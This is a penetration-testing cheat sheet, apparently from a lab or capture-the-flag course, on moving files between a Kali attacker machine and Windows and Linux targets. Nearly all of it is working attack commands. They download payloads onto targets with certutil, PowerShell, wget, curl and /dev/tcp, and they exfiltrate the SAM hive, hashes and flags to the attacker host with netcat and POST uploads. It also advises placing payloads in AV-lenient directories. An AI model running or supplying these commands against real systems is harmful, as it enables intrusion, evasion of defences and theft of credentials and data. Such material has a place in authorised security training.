# 07 — File Transfer  (Kali ↔ target)

Serve from Kali, pull from target. Keep a web server running in your payloads dir.

## Serve files from Kali
```bash
cd payloads/ && python3 -m http.server 8081          # http://LHOST:8081/<file>
# alternatives:
python3 -m uploadserver 8081                          # also accepts POST uploads (exfil)
impacket-smbserver share $(pwd) -smb2support          # \\LHOST\share\  (SMB pull, no creds)
impacket-smbserver share $(pwd) -smb2support -user u -password p   # authed if target needs it
```

## Pull TO a Windows target
```cmd
REM certutil LOLbin (Tut10 Charlice — works on locked-down boxes):
certutil.exe -urlcache -f http://LHOST:8081/SigmaPotato.exe C:\Windows\Temp\sp.exe

REM PowerShell:
powershell -c "Invoke-WebRequest http://LHOST:8081/nc.exe -OutFile C:\Windows\Temp\nc.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST:8081/x.exe','C:\Windows\Temp\x.exe')"

REM SMB (from impacket-smbserver):
copy \\LHOST\share\winPEASx64.exe C:\Windows\Temp\
```
Good target dirs (writable, usually AV-lenient): `C:\Windows\Temp\`, `C:\Users\Public\`, `%TEMP%`.

## Pull TO a Linux target
```bash
wget http://LHOST:8081/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
curl http://LHOST:8081/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64
# no wget/curl? use /dev/tcp or scp:
exec 3<>/dev/tcp/LHOST/8081; echo -e "GET /f HTTP/1.0\n" >&3; cat <&3 > /tmp/f
scp file user@LHOST:/path          # if you have SSH the other way
```

## Exfil FROM target → Kali (flags, loot, hashes)
```bash
# Kali side (receiver):
nc -lvnp 6666 > loot/exfil.dat                 # then on target:  nc LHOST 6666 < file
# or run an upload server (above) and POST:
```
```powershell
# Windows target -> POST a file to Kali uploadserver:
powershell -c "Invoke-WebRequest -Uri http://LHOST:8081/upload -Method POST -InFile C:\loot\sam"
```
```cmd
REM quick: just read the flag and copy its text into your report (no transfer needed)
type C:\Users\Administrator\Desktop\flag_hard.txt
```

## Base64 clipboard trick (tiny files, no network dir)
```bash
# Kali: encode
base64 -w0 payloads/sp.exe
```
```powershell
# target: decode (paste the blob)
[IO.File]::WriteAllBytes("C:\Windows\Temp\sp.exe",[Convert]::FromBase64String("<BLOB>"))
```
```bash
# reverse (read a file off target): on target  base64 -w0 /root/flag_hard.txt  -> paste to Kali:
echo '<BLOB>' | base64 -d
```

## Gotchas
- Standard Kali serve port here = **8081** (keep 4444/5555/6666 for shells only).
- `certutil -urlcache -f` is the money move on hardened Windows (no PowerShell needed).
- Drop payloads in `C:\Windows\Temp\` — writable by low-priv users, survives most restrictions.
- Don't forget to `chmod +x` Linux tools after pulling them.
